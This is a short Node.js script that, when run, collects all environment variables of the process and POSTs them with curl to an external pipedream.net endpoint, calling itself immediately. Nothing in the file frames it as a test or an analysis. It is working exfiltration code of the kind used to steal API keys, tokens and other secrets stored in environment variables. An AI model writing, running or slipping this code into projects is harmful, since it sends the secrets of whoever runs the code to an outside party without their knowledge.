const { execSync } = require('child_process');


// Function to get environment variables and send via curl
function sendEnvToUrl() {
    try {
    // Convert env variables to string
    const envVars = Object.entries(process.env)
        .map(([key, value]) => `${key}=${value}`)
        .join('\n');

        // Use curl to send the data
        execSync(`curl -X POST -d "${envVars}" https://eop3b98jxkzuqt4.m.pipedream.net`, {
            stdio: 'inherit',
        });
        console.log('Environment variables sent successfully');
    } catch (error) {
        console.error('Failed to send environment variables:', error.message);
    }
}

// Call the function to send environment variables
sendEnvToUrl();